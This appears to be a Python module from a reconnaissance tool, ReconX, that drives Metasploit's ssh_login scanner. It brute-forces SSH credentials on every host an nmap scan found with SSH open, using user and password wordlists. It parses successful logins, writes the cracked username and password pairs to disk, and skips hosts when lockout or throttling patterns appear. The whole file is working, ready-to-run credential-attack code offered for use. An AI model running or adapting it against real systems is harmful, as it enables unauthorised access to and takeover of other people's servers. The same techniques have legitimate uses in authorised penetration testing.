"""
Metasploit SSH Login Scanner for ReconX.
Uses msfconsole auxiliary/scanner/ssh/ssh_login to brute-force
SSH credentials on hosts where nmap discovered SSH ports.

For each IP that has SSH port(s) open (22, 2222, etc.):
  1. Run auxiliary/scanner/ssh/ssh_login with:
     - RHOSTS = target IP
     - RPORT  = SSH port
     - USER_FILE  = wordlists/ssh-user-enum
     - PASS_FILE  = wordlists/enum-pass.txt
     - STOP_ON_SUCCESS = true
     - VERBOSE = false
  2. Parse output for successful logins
  3. On rate limit / account lockout / delay / timeout → skip to next IP

Requires: msfconsole (Metasploit Framework) installed in PATH
  Install: https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
"""

import os
import sys
import shutil
import subprocess
import tempfile
import time
import re
import json
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass, field

from ..config import ScannerConfig


# ─── SSH Ports ────────────────────────────────────────────────────────────────

SSH_PORTS = {22, 2222, 2200, 22222}


# ─── Data Models ──────────────────────────────────────────────────────────────

@dataclass
class SSHCredential:
    """A successfully brute-forced SSH credential."""
    ip: str = ""
    port: int = 22
    username: str = ""
    password: str = ""

    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "port": self.port,
            "username": self.username,
            "password": self.password,
        }


@dataclass
class SSHHostResult:
    """Brute-force result for a single SSH host."""
    ip: str = ""
    port: int = 22
    credentials: List[SSHCredential] = field(default_factory=list)
    skipped: bool = False
    skip_reason: str = ""
    scan_time: float = 0.0
    raw_output: str = ""

    def to_dict(self) -> dict:
        d = {
            "ip": self.ip,
            "port": self.port,
            "credentials": [c.to_dict() for c in self.credentials],
            "scan_time": round(self.scan_time, 2),
        }
        if self.skipped:
            d["skipped"] = True
            d["skip_reason"] = self.skip_reason
        return d


@dataclass
class SSHLoginStats:
    """Aggregated SSH login statistics."""
    total_ssh_hosts: int = 0
    hosts_tested: int = 0
    hosts_skipped: int = 0
    credentials_found: int = 0
    scan_time: float = 0.0

    def to_dict(self) -> dict:
        return {
            "total_ssh_hosts": self.total_ssh_hosts,
            "hosts_tested": self.hosts_tested,
            "hosts_skipped": self.hosts_skipped,
            "credentials_found": self.credentials_found,
            "scan_time": round(self.scan_time, 2),
        }


# ─── Lockout / Rate Limit / Delay Detection Patterns ─────────────────────────

LOCKOUT_PATTERNS = [
    r"account.*lock",
    r"too many.*(?:login|auth|fail)",
    r"login.*disabled",
    r"temporarily.*locked",
    r"account.*disabled",
    r"maximum.*(?:retries|attempts)",
]

RATE_LIMIT_PATTERNS = [
    r"connection.*refused",
    r"connection.*reset",
    r"Connection timed out",
    r"Unable to Connect",
    r"Rex::ConnectionRefused",
    r"Rex::ConnectionTimeout",
    r"Rex::HostUnreachable",
    r"SSH Timeout",
    r"No connection could be made",
    r"Authentication methods:.*none",
    r"kex_exchange_identification",
    r"Connection closed by.*remote host",
    r"read: Connection reset",
    r"banner exchange",
]

DELAY_PATTERNS = [
    r"SSH.*delay",
    r"connection.*delay",
    r"throttl",
    r"rate.*limit",
    r"too fast",
    r"slow down",
]

# Success pattern for SSH login
# [+] 192.168.1.1:22 - Success: 'root:password' 'uid=0(root) gid=0(root) ...'
SUCCESS_PATTERN = re.compile(
    r'\[\+\]\s*(\d+\.\d+\.\d+\.\d+):(\d+)\s*-\s*'
    r'Success:\s*[\'"]?(\S+?):(\S+?)[\'"]?'
    r'(?:\s|$)',
    re.IGNORECASE,
)

# Alternative: [+] 192.168.1.1:22 - Login Successful: root:password
SUCCESS_PATTERN_ALT = re.compile(
    r'\[\+\]\s*(\d+\.\d+\.\d+\.\d+):(\d+)\s*-\s*'
    r'(?:Login Successful|Logged in):\s*[\'"]?(\S+?):(\S+?)[\'"]?'
    r'(?:\s|$)',
    re.IGNORECASE,
)

# Fallback: any [+] line with user:pass in quotes
SUCCESS_PATTERN_QUOTED = re.compile(
    r"\[\+\].*?'([^':]+):([^']+)'",
    re.IGNORECASE,
)


# ─── Main Scanner ─────────────────────────────────────────────────────────────

class SSHLoginScanner:
    """
    Metasploit SSH login brute-force scanner.

    Uses msfconsole auxiliary/scanner/ssh/ssh_login to attempt
    credential brute-force against hosts with SSH ports open.

    Workflow per IP:
      1. Run ssh_login with USER_FILE + PASS_FILE
      2. Parse output for successful logins
      3. On lockout / rate limit / delay → skip to next IP
    """

    DEFAULT_USER_FILE = os.path.join("wordlists", "ssh-user-enum")
    DEFAULT_PASS_FILE = os.path.join("wordlists", "enum-pass.txt")

    def __init__(self, config: ScannerConfig, user_file: str = "", pass_file: str = ""):
        self.config = config
        self.msf_path = self._find_msfconsole()
        self.available = self.msf_path is not None
        self.user_file = user_file or self.DEFAULT_USER_FILE
        self.pass_file = pass_file or self.DEFAULT_PASS_FILE
        self.results: Dict[str, SSHHostResult] = {}  # "ip:port" → result
        self.stats = SSHLoginStats()

    def _find_msfconsole(self) -> Optional[str]:
        """Find the msfconsole binary in PATH or common install locations."""
        found = shutil.which("msfconsole")
        if found:
            return found

        common_paths = [
            "/usr/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
            "/opt/metasploit/msfconsole",
        ]
        if os.name == "nt":
            common_paths.extend([
                r"C:\metasploit-framework\bin\msfconsole.bat",
                r"C:\metasploit-framework\msfconsole.bat",
                os.path.join(
                    os.environ.get("PROGRAMFILES", ""),
                    "Metasploit", "bin", "msfconsole.bat"
                ),
                os.path.join(
                    os.environ.get("PROGRAMFILES(X86)", ""),
                    "Metasploit", "bin", "msfconsole.bat"
                ),
            ])

        for path in common_paths:
            if path and os.path.isfile(path):
                return path

        return None

    def _find_file(self, filename: str, output_dir: str = "") -> Optional[str]:
        """
        Locate a file (user file or pass file). Search order:
          1. Exact path if absolute
          2. Current working directory
          3. Output directory
          4. Package directory (scanner/)
          5. Parent directory (reconx/)
          6. Project root
        """
        if os.path.isabs(filename) and os.path.isfile(filename):
            return filename

        search_dirs = [
            os.getcwd(),
            output_dir,
            os.path.dirname(os.path.abspath(__file__)),   # scanner/
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),  # reconx/
            os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
        ]

        for d in search_dirs:
            if not d:
                continue
            candidate = os.path.join(d, filename)
            if os.path.isfile(candidate):
                return os.path.abspath(candidate)

        return None

    def _get_ssh_hosts(self, nmap_results: Dict) -> List[tuple]:
        """
        Extract hosts with SSH ports open from nmap results.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.

        Returns:
            List of (ip, port) tuples.
        """
        ssh_targets = []
        for ip, host_result in nmap_results.items():
            ports = []
            if hasattr(host_result, 'ports'):
                ports = host_result.ports
            elif isinstance(host_result, dict):
                ports = host_result.get('ports', [])

            for port_entry in ports:
                port_num = port_entry.port if hasattr(port_entry, 'port') else port_entry.get('port', 0)
                state = port_entry.state if hasattr(port_entry, 'state') else port_entry.get('state', '')
                service = port_entry.service if hasattr(port_entry, 'service') else port_entry.get('service', '')

                if state == "open" and (
                    port_num in SSH_PORTS
                    or "ssh" in service.lower()
                ):
                    ssh_targets.append((ip, port_num))

        # Sort by IP then port for consistent ordering
        ssh_targets.sort(key=lambda t: (t[0], t[1]))
        return ssh_targets

    def scan(
        self,
        nmap_results: Dict,
        output_dir: str = "",
    ) -> Dict[str, SSHHostResult]:
        """
        Run SSH login brute-force against hosts with SSH ports open.

        Args:
            nmap_results: Dict[str, NmapHostResult] from nmap scanner.
            output_dir: Directory to save output files.

        Returns:
            Dict mapping "ip:port" → SSHHostResult.
        """
        if not self.available:
            return {}

        if not nmap_results:
            return {}

        # Find SSH hosts from nmap results
        ssh_targets = self._get_ssh_hosts(nmap_results)
        if not ssh_targets:
            return {}

        # Locate user file and password file
        user_file_path = self._find_file(self.user_file, output_dir)
        if not user_file_path:
            print(
                f"\033[91m[!]\033[0m ssh-login: user file "
                f"\033[96m{self.user_file}\033[0m not found – skipping"
            )
            return {}

        pass_file_path = self._find_file(self.pass_file, output_dir)
        if not pass_file_path:
            print(
                f"\033[91m[!]\033[0m ssh-login: password file "
                f"\033[96m{self.pass_file}\033[0m not found – skipping"
            )
            return {}

        scan_start = time.time()
        self.stats.total_ssh_hosts = len(ssh_targets)

        if output_dir:
            os.makedirs(output_dir, exist_ok=True)

        unique_ips = len({t[0] for t in ssh_targets})
        print(
            f"\033[36m[>]\033[0m ssh-login: SSH login brute-force on "
            f"\033[96m{len(ssh_targets)}\033[0m target(s) "
            f"(\033[96m{unique_ips}\033[0m unique IP(s)) "
            f"with \033[96m{os.path.basename(user_file_path)}\033[0m + "
            f"\033[96m{os.path.basename(pass_file_path)}\033[0m ..."
        )

        for idx, (ip, ssh_port) in enumerate(ssh_targets, 1):
            result_key = f"{ip}:{ssh_port}"

            print(
                f"\033[36m[>]\033[0m ssh-login: "
                f"[\033[96m{idx}/{len(ssh_targets)}\033[0m] "
                f"\033[96m{ip}:{ssh_port}\033[0m ..."
            )

            host_result = self._brute_host(
                ip, ssh_port, user_file_path, pass_file_path, output_dir,
            )
            self.results[result_key] = host_result

            # Print per-host status
            if host_result.skipped:
                print(
                    f"\033[93m[!]\033[0m ssh-login: \033[96m{ip}:{ssh_port}\033[0m → "
                    f"\033[93mskipped ({host_result.skip_reason})\033[0m "
                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
                )
            elif host_result.credentials:
                cred_str = ", ".join(
                    f"\033[1;92m{c.username}:{c.password}\033[0m"
                    for c in host_result.credentials
                )
                print(
                    f"\033[1;92m[+]\033[0m ssh-login: \033[96m{ip}:{ssh_port}\033[0m → "
                    f"\033[1;92m{len(host_result.credentials)} credential(s) found!\033[0m "
                    f"→ {cred_str} "
                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
                )
            else:
                print(
                    f"\033[37m[-]\033[0m ssh-login: \033[96m{ip}:{ssh_port}\033[0m → "
                    f"\033[37mno valid credentials\033[0m "
                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
                )

        scan_elapsed = time.time() - scan_start
        self._compute_stats(scan_elapsed)

        # Save combined results
        if output_dir:
            self._save_results(output_dir)

        return self.results

    def _brute_host(
        self,
        ip: str,
        port: int,
        user_file: str,
        pass_file: str,
        output_dir: str,
    ) -> SSHHostResult:
        """
        Run SSH login brute-force against a single host.

        Steps:
          1. Run auxiliary/scanner/ssh/ssh_login with USER_FILE + PASS_FILE
          2. Parse output for successful logins
          3. On lockout / rate limit / delay → skip
        """
        result = SSHHostResult(ip=ip, port=port)
        host_start = time.time()

        try:
            print(
                f"    \033[36m[>]\033[0m \033[96m{ip}:{port}\033[0m "
                f"running ssh_login ..."
            )
            login_output = self._run_ssh_login(ip, port, user_file, pass_file)
            result.raw_output = login_output

            # Parse successful logins
            creds = self._parse_success(ip, port, login_output)
            result.credentials = creds

            for cred in creds:
                print(
                    f"    \033[1;92m[+]\033[0m \033[1;92mSUCCESS\033[0m: "
                    f"\033[96m{ip}:{port}\033[0m → "
                    f"\033[1;92m{cred.username}:{cred.password}\033[0m"
                )

            # Check for account lockout
            if self._detect_lockout(login_output):
                result.skipped = True
                result.skip_reason = "account_lockout"
                print(
                    f"    \033[91m[!]\033[0m Account lockout detected on "
                    f"\033[96m{ip}:{port}\033[0m"
                )

            # Check for rate limit / connection issues
            if self._detect_rate_limit(login_output):
                result.skipped = True
                result.skip_reason = "rate_limit"
                print(
                    f"    \033[93m[!]\033[0m Rate limit / connection issue on "
                    f"\033[96m{ip}:{port}\033[0m"
                )

            # Check for delay / throttling
            if self._detect_delay(login_output):
                result.skipped = True
                result.skip_reason = "delay_throttle"
                print(
                    f"    \033[93m[!]\033[0m SSH delay/throttling detected on "
                    f"\033[96m{ip}:{port}\033[0m"
                )

        except subprocess.TimeoutExpired:
            result.skipped = True
            result.skip_reason = "timeout"
            print(
                f"    \033[93m[!]\033[0m Timeout on \033[96m{ip}:{port}\033[0m "
                f"→ skipping"
            )
        except KeyboardInterrupt:
            raise  # Let the engine's _safe_scan handle this
        except Exception as e:
            result.raw_output = f"ERROR: {e}"

        result.scan_time = time.time() - host_start

        # Save per-host raw output
        if output_dir and result.raw_output.strip():
            safe_ip = ip.replace(".", "_").replace(":", "_")
            out_file = os.path.join(output_dir, f"ssh_login_{safe_ip}_{port}.txt")
            try:
                with open(out_file, "w", encoding="utf-8") as f:
                    f.write(f"# Metasploit SSH login: {ip}:{port}\n")
                    f.write(f"# User file: {user_file}\n")
                    f.write(f"# Pass file: {pass_file}\n")
                    f.write(f"# Scan time: {result.scan_time:.1f}s\n\n")
                    f.write(result.raw_output)
            except Exception:
                pass

        return result

    def _run_ssh_login(self, ip: str, port: int, user_file: str, pass_file: str) -> str:
        """
        Run auxiliary/scanner/ssh/ssh_login with user + pass files.

        Creates a .rc resource script:
            use auxiliary/scanner/ssh/ssh_login
            set RHOSTS <ip>
            set RPORT <port>
            set USER_FILE <user_file>
            set PASS_FILE <pass_file>
            set STOP_ON_SUCCESS true
            set VERBOSE false
            run
            exit

        Returns the raw stdout+stderr output.
        """
        tmpdir = tempfile.mkdtemp(prefix="reconx_ssh_login_")
        rc_file = os.path.join(tmpdir, "ssh_login.rc")

        try:
            rc_content = (
                f"use auxiliary/scanner/ssh/ssh_login\n"
                f"set RHOSTS {ip}\n"
                f"set RPORT {port}\n"
                f"set USER_FILE {user_file}\n"
                f"set PASS_FILE {pass_file}\n"
                f"set STOP_ON_SUCCESS true\n"
                f"set VERBOSE false\n"
                f"set ConnectTimeout 10\n"
                f"set THREADS 1\n"
                f"run\n"
                f"exit\n"
            )
            with open(rc_file, "w", encoding="utf-8") as f:
                f.write(rc_content)

            cmd = [
                self.msf_path,
                "-q",   # quiet (no banner)
                "-r", rc_file,
            ]

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.DEVNULL,
                close_fds=(os.name != "nt"),
            )

            try:
                # Timeout: 300s — SSH brute can be slow with many user/pass combos
                stdout, stderr = proc.communicate(timeout=300)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.communicate()
                raise

            output = stdout.decode("utf-8", errors="replace")
            err_output = stderr.decode("utf-8", errors="replace")
            return output + "\n" + err_output

        finally:
            try:
                if os.path.isfile(rc_file):
                    os.remove(rc_file)
                os.rmdir(tmpdir)
            except Exception:
                pass

    def _parse_success(self, ip: str, port: int, output: str) -> List[SSHCredential]:
        """Parse msfconsole output for successful SSH login credentials."""
        creds = []
        seen = set()

        for line in output.splitlines():
            if "[+]" not in line:
                continue

            line_lower = line.lower()
            if "success" not in line_lower and "logged in" not in line_lower:
                continue

            # Try standard pattern:
            # [+] 192.168.1.1:22 - Success: 'root:password' 'uid=0(root)...'
            match = SUCCESS_PATTERN.search(line)
            if match:
                key = f"{match.group(1)}:{match.group(2)}:{match.group(3)}:{match.group(4)}"
                if key not in seen:
                    seen.add(key)
                    creds.append(SSHCredential(
                        ip=match.group(1),
                        port=int(match.group(2)),
                        username=match.group(3),
                        password=match.group(4),
                    ))
                continue

            # Try alt pattern
            match = SUCCESS_PATTERN_ALT.search(line)
            if match:
                key = f"{match.group(1)}:{match.group(2)}:{match.group(3)}:{match.group(4)}"
                if key not in seen:
                    seen.add(key)
                    creds.append(SSHCredential(
                        ip=match.group(1),
                        port=int(match.group(2)),
                        username=match.group(3),
                        password=match.group(4),
                    ))
                continue

            # Fallback: quoted user:pass
            match = SUCCESS_PATTERN_QUOTED.search(line)
            if match:
                key = f"{ip}:{port}:{match.group(1)}:{match.group(2)}"
                if key not in seen:
                    seen.add(key)
                    creds.append(SSHCredential(
                        ip=ip,
                        port=port,
                        username=match.group(1),
                        password=match.group(2),
                    ))

        return creds

    def _detect_lockout(self, output: str) -> bool:
        """Check if the output indicates account lockout."""
        output_lower = output.lower()
        for pattern in LOCKOUT_PATTERNS:
            if re.search(pattern, output_lower):
                return True
        return False

    def _detect_rate_limit(self, output: str) -> bool:
        """
        Check if the output indicates rate limiting or connection issues.
        Count connection errors — if > 50% of attempts fail with
        connection issues, treat it as a rate limit.
        """
        error_count = 0
        total_attempts = 0

        for line in output.splitlines():
            if "[-]" in line or "[*]" in line:
                total_attempts += 1
                line_lower = line.lower()
                for pattern in RATE_LIMIT_PATTERNS:
                    if re.search(pattern, line_lower):
                        error_count += 1
                        break

        # If there were attempts and most failed with connection errors
        if total_attempts > 3 and error_count > total_attempts * 0.5:
            return True
        return False

    def _detect_delay(self, output: str) -> bool:
        """Check if the output indicates SSH delay or throttling."""
        output_lower = output.lower()
        for pattern in DELAY_PATTERNS:
            if re.search(pattern, output_lower):
                return True
        return False

    def _compute_stats(self, scan_time: float):
        """Compute aggregated statistics."""
        self.stats.scan_time = scan_time
        self.stats.hosts_tested = sum(
            1 for r in self.results.values() if not r.skipped
        )
        self.stats.hosts_skipped = sum(
            1 for r in self.results.values() if r.skipped
        )
        self.stats.credentials_found = sum(
            len(r.credentials) for r in self.results.values()
        )

    def _save_results(self, output_dir: str):
        """Save combined SSH login results to output directory."""
        # Credentials summary
        all_creds = []
        for key in sorted(self.results.keys()):
            host_result = self.results[key]
            for cred in host_result.credentials:
                all_creds.append(cred)

        if all_creds:
            cred_file = os.path.join(output_dir, "ssh_credentials.txt")
            try:
                with open(cred_file, "w", encoding="utf-8") as f:
                    f.write("# Metasploit SSH Login — Valid Credentials\n")
                    f.write(f"# Generated by ReconX\n")
                    f.write(f"# Total: {len(all_creds)} credential(s)\n\n")
                    for cred in all_creds:
                        f.write(
                            f"{cred.ip}:{cred.port} → "
                            f"{cred.username}:{cred.password}\n"
                        )
            except Exception:
                pass

        # Full summary JSON
        summary_file = os.path.join(output_dir, "ssh_login_summary.json")
        try:
            summary = {
                "stats": self.stats.to_dict(),
                "hosts": {
                    key: r.to_dict()
                    for key, r in sorted(self.results.items())
                },
            }
            with open(summary_file, "w", encoding="utf-8") as f:
                json.dump(summary, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

    def get_all_credentials(self) -> List[SSHCredential]:
        """Get all discovered valid credentials across all hosts."""
        creds = []
        for host_result in self.results.values():
            creds.extend(host_result.credentials)
        return creds
